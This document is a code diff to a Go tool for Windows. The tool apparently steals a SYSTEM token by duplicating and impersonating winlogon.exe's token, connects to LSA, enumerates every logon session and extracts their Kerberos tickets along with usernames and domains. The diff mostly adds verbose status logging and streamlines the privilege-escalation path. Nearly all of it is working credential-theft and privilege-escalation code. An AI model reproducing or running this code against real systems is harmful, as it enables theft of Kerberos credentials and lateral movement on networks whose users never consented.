@@ -332,12 +332,15 @@ asn.1 helper funcs
 */
 
 func parseTicketData(encodedTicket []byte) (*KrbCred, error) {
+	fmt.Printf("[*] Parsing ticket data (%d bytes)\n", len(encodedTicket))
 	var krbCred KrbCred
 	rest, err := asn1.UnmarshalWithParams(encodedTicket, &krbCred, "application,tag:22")
 	if err != nil {
+		fmt.Printf("[-] Failed to unmarshal KRB-CRED: %v\n", err)
 		return nil, fmt.Errorf("failed to unmarshal KRB-CRED: %v", err)
 	}
 	if len(rest) > 0 {
+		fmt.Printf("[-] Warning: Extra data found after KRB-CRED\n")
 		return nil, fmt.Errorf("extra data after KRB-CRED")
 	}
 	return &krbCred, nil
@@ -346,17 +349,6 @@ func parseTicketData(encodedTicket []byte) (*KrbCred, error) {
 /*
 kerberos helper funcs
 */
-func newKRBCred() *KrbCred {
-	return &KrbCred{
-		Pvno:    5,
-		MsgType: 22,
-		Tickets: []Ticket{},
-		EncPart: EncKrbCredPart{
-			TicketInfo: []KrbCredInfo{}, // Capital T in TicketInfo
-		},
-	}
-}
-
 func lsaStrToString(s LsaString) string {
 	if s.Length == 0 {
 		return ""
@@ -367,6 +359,7 @@ func lsaStrToString(s LsaString) string {
 }
 
 func enumerateLogonSessions() ([]windows.LUID, error) {
+	fmt.Printf("[*] Enumerating logon sessions\n")
 	var count uint32
 	var luids uintptr
 
@@ -376,6 +369,7 @@ func enumerateLogonSessions() ([]windows.LUID, error) {
 	)
 
 	if ret != 0 {
+		fmt.Printf("[-] LsaEnumerateLogonSessions failed: 0x%x\n", ret)
 		return nil, fmt.Errorf("LsaEnumerateLogonSessions failed with error: 0x%x", ret)
 	}
 
@@ -383,18 +377,21 @@ func enumerateLogonSessions() ([]windows.LUID, error) {
 	for i := uint32(0); i < count; i++ {
 		luid := (*windows.LUID)(unsafe.Pointer(luids + uintptr(i)*unsafe.Sizeof(windows.LUID{})))
 		luidSlice[i] = *luid
+		fmt.Printf("[+] Found session LUID: 0x%x:0x%x\n", luid.HighPart, luid.LowPart)
 	}
 
 	defer LsaFreeReturnBuffer.Call(luids)
-
+	fmt.Printf("[+] Found %d logon sessions\n", count)
 	return luidSlice, nil
 }
 
 func getCurrentLUID() (windows.LUID, error) {
+	fmt.Printf("[*] Getting current LUID\n")
 	var currentToken windows.Token
 	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &currentToken)
 	if err != nil {
-		return windows.LUID{}, fmt.Errorf("OpenProcessToken failed with error: %v", err)
+		fmt.Printf("[-] OpenProcessToken failed: %v\n", err)
+		return windows.LUID{}, fmt.Errorf("OpenProcessToken failed: %v", err)
 	}
 	defer currentToken.Close()
 
@@ -403,9 +400,13 @@ func getCurrentLUID() (windows.LUID, error) {
 
 	err = windows.GetTokenInformation(currentToken, windows.TokenStatistics, (*byte)(unsafe.Pointer(&tokenStats)), uint32(unsafe.Sizeof(tokenStats)), &returnLength)
 	if err != nil {
-		return windows.LUID{}, fmt.Errorf("GetTokenInformation failed with error: %v", err)
+		fmt.Printf("[-] GetTokenInformation failed: %v\n", err)
+		return windows.LUID{}, fmt.Errorf("GetTokenInformation failed: %v", err)
 	}
 
+	fmt.Printf("[+] Current LUID: 0x%x:0x%x\n",
+		tokenStats.AuthenticationId.HighPart,
+		tokenStats.AuthenticationId.LowPart)
 	return tokenStats.AuthenticationId, nil
 }
 
@@ -451,15 +452,18 @@ func getLogonSessionData(luid windows.LUID) (*LogonSessionData, error) {
 }
 
 func isAdmin() (bool, error) {
+	fmt.Printf("[*] Checking admin status\n")
 	var token windows.Token
 	process, err := windows.GetCurrentProcess()
 	if err != nil {
-		return false, fmt.Errorf("GetCurrentProcess failed with error: %v", err)
+		fmt.Printf("[-] GetCurrentProcess failed: %v\n", err)
+		return false, fmt.Errorf("GetCurrentProcess failed: %v", err)
 	}
 
 	err = windows.OpenProcessToken(process, windows.TOKEN_QUERY, &token)
 	if err != nil {
-		return false, fmt.Errorf("OpenProcessToken failed with error: %v", err)
+		fmt.Printf("[-] OpenProcessToken failed: %v\n", err)
+		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
 	}
 	defer token.Close()
 
@@ -467,10 +471,13 @@ func isAdmin() (bool, error) {
 	var size uint32
 	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&elevated)), uint32(unsafe.Sizeof(elevated)), &size)
 	if err != nil {
-		return false, fmt.Errorf("GetTokenInformation failed with error: %v", err)
+		fmt.Printf("[-] GetTokenInformation failed: %v\n", err)
+		return false, fmt.Errorf("GetTokenInformation failed: %v", err)
 	}
 
-	return elevated != 0, nil
+	isElevated := elevated != 0
+	fmt.Printf("[+] Admin status: %v\n", isElevated)
+	return isElevated, nil
 }
 
 func newLSAString(s string) *LsaString {
@@ -716,15 +723,18 @@ func isSystem() (bool, error) {
 }
 
 func getSystem() bool {
+	fmt.Printf("[*] Attempting to get SYSTEM privileges\n")
 	isHighIntegrity, err := isHighIntegrity()
 	if err != nil {
+		fmt.Printf("[-] Failed to check integrity level: %v\n", err)
 		return false
 	}
 
 	if !isHighIntegrity {
-		//var token windows.Token
+		fmt.Printf("[*] Current process is not high integrity, looking for winlogon.exe\n")
 		snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 		if err != nil {
+			fmt.Printf("[-] Failed to create process snapshot: %v\n", err)
 			return false
 		}
 		defer windows.CloseHandle(snapshot)
@@ -732,25 +742,28 @@ func getSystem() bool {
 		var procEntry windows.ProcessEntry32
 		procEntry.Size = uint32(unsafe.Sizeof(procEntry))
 		if err := windows.Process32First(snapshot, &procEntry); err != nil {
+			fmt.Printf("[-] Failed to get first process: %v\n", err)
 			return false
 		}
 
 		for {
 			processName := windows.UTF16ToString(procEntry.ExeFile[:])
 			if processName == "winlogon.exe" {
+				fmt.Printf("[+] Found winlogon.exe (PID: %d)\n", procEntry.ProcessID)
 				handle, err := windows.OpenProcess(
 					PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
 					false,
 					procEntry.ProcessID,
 				)
 				if err != nil {
-					// this might not be the best way to handle this, although winlogon should only occur once in the ptree i believe?
+					fmt.Printf("[-] Failed to open winlogon.exe: %v\n", err)
 					return false
 				}
 
 				var token windows.Token
 				err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE, &token)
 				if err != nil {
+					fmt.Printf("[-] Failed to open process token: %v\n", err)
 					return false
 				}
 				defer token.Close()
@@ -758,67 +771,69 @@ func getSystem() bool {
 				var duplicateToken windows.Token
 				err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenPrimary, &duplicateToken)
 				if err != nil {
+					fmt.Printf("[-] Failed to duplicate token: %v\n", err)
 					return false
 				}
 
 				ret, _, err := ImpersonateLoggedOnUser.Call(uintptr(token))
 				if ret != 0 {
-					fmt.Printf("error: %v", err)
+					fmt.Printf("[-] Failed to impersonate user: %v\n", err)
+					return false
 				}
 
-				fmt.Printf("token should be NT AUTHORITY\\SYSTEM now\n")
+				fmt.Printf("[+] Successfully impersonated SYSTEM token\n")
 				return true
 			}
 
 			err = windows.Process32Next(snapshot, &procEntry)
 			if err != nil {
 				if err == windows.ERROR_NO_MORE_FILES {
+					fmt.Printf("[-] Could not find winlogon.exe process\n")
 					break
 				}
+				fmt.Printf("[-] Error enumerating processes: %v\n", err)
 				return false
 			}
 		}
 		return false
 	}
+	fmt.Printf("[*] Process already running with high integrity\n")
 	return false
 }
 
 func getLsaHandle() (windows.Handle, error) {
+	fmt.Printf("[*] Getting LSA handle\n")
 	isHighIntegrity, err := isHighIntegrity()
 	if err != nil {
+		fmt.Printf("[-] Failed to check integrity level: %v\n", err)
 		return 0, err
 	}
 
 	isSystem, err := isSystem()
 	if err != nil {
+		fmt.Printf("[-] Failed to check SYSTEM status: %v\n", err)
 		return 0, err
 	}
 
 	var lsaHandle windows.Handle
 	if isHighIntegrity && !isSystem {
-		// elevated, but not system. time to impersonate some tokens
-		// todo: getSystem()
+		fmt.Printf("[*] High integrity but not SYSTEM, attempting privilege escalation\n")
 		gotSystem := getSystem()
-		if gotSystem != true {
-			fmt.Printf("getSystem failed: %v", err)
-			return 0, err
-		}
-
-		ret, _, err := LsaConnectUntrusted.Call(
-			uintptr(unsafe.Pointer(&lsaHandle)),
-		)
-		if ret != 0 {
-			return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed with error: %v", err)
-		}
-	} else {
-		ret, _, err := LsaConnectUntrusted.Call(
-			uintptr(unsafe.Pointer(&lsaHandle)),
-		)
-		if ret != 0 {
-			return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed with error: %v", err)
+		if !gotSystem {
+			fmt.Printf("[-] Failed to get SYSTEM privileges\n")
+			return 0, fmt.Errorf("failed to get SYSTEM privileges")
 		}
 	}
 
+	ret, _, err := LsaConnectUntrusted.Call(
+		uintptr(unsafe.Pointer(&lsaHandle)),
+	)
+	if ret != 0 {
+		fmt.Printf("[-] LsaConnectUntrusted failed: %v\n", err)
+		return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed: %v", err)
+	}
+
+	fmt.Printf("[+] Successfully obtained LSA handle\n")
 	return lsaHandle, nil
 }
 
@@ -841,30 +856,40 @@ func getAuthenticationPackage(lsaHandle windows.Handle, lsaString *LsaString) (u
 * public bois
  */
 func GetKerberosTickets() []map[string]interface{} {
+	fmt.Printf("[*] Starting Kerberos ticket collection\n")
 	var ticketCache []map[string]interface{}
+
 	lsaHandle, err := getLsaHandle()
 	if err != nil {
+		fmt.Printf("[-] Failed to get LSA handle: %v\n", err)
 		return nil
 	}
 
 	kerberosString := newLSAString("kerberos")
 	authPackage, err := getAuthenticationPackage(lsaHandle, kerberosString)
 	if err != nil {
+		fmt.Printf("[-] Failed to get authentication package: %v\n", err)
 		return nil
 	}
+	fmt.Printf("[+] Got Kerberos authentication package\n")
 
 	sessionCreds, err := enumerateTickets(lsaHandle, authPackage)
 	if err != nil {
+		fmt.Printf("[-] Failed to enumerate tickets: %v\n", err)
 		return nil
 	}
+	fmt.Printf("[+] Found %d session credentials\n", len(sessionCreds))
 
 	ticketCache = make([]map[string]interface{}, 0)
 	for _, cred := range sessionCreds {
+		fmt.Printf("[*] Processing tickets for %s\\%s\n", cred.LogonSession.LogonDomain, cred.LogonSession.Username)
 		for _, ticket := range cred.Tickets {
 			extractedTicket, err := extractTicket(lsaHandle, authPackage, cred.LogonSession.LogonID, ticket.ServerName)
 			if err != nil {
+				fmt.Printf("[-] Failed to extract ticket for %s: %v\n", ticket.ServerName, err)
 				continue
 			}
+			fmt.Printf("[+] Successfully extracted ticket for %s\n", ticket.ServerName)
 
 			ticket := map[string]interface{}{
 				"username":    cred.LogonSession.Username,
@@ -884,7 +909,10 @@ func GetKerberosTickets() []map[string]interface{} {
 	}
 
 	if len(ticketCache) > 0 {
+		fmt.Printf("[+] Successfully collected %d Kerberos tickets\n", len(ticketCache))
 		return ticketCache
 	}
+
+	fmt.Printf("[-] No Kerberos tickets found\n")
 	return nil
 }
